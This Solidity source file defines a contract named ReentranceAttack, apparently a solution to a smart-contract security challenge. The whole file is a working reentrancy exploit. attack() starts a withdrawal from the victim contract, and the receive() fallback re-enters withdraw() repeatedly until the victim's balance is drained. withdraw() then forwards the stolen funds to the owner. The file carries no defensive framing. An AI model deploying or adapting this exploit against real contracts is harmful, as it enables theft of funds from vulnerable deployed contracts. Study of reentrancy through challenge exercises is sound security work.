// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "interfaces/IReentrance.sol";

contract ReentranceAttack {
    address payable owner;
    IReentrance victimContract;

    constructor(IReentrance _victimContract) public {
        victimContract = _victimContract;
        owner = msg.sender;
    }

    function withdraw() external {
        owner.transfer(address(this).balance);
    }

    function attack() external {
        victimContract.withdraw(victimContract.balanceOf(address(this)));
    }

    receive() external payable {
        uint256 amountToWithdraw = victimContract.balanceOf(address(this));
        if (amountToWithdraw > address(victimContract).balance) {
            amountToWithdraw = address(victimContract).balance;
        }

        if (amountToWithdraw > 0) {
            victimContract.withdraw(amountToWithdraw);
        }
    }
}
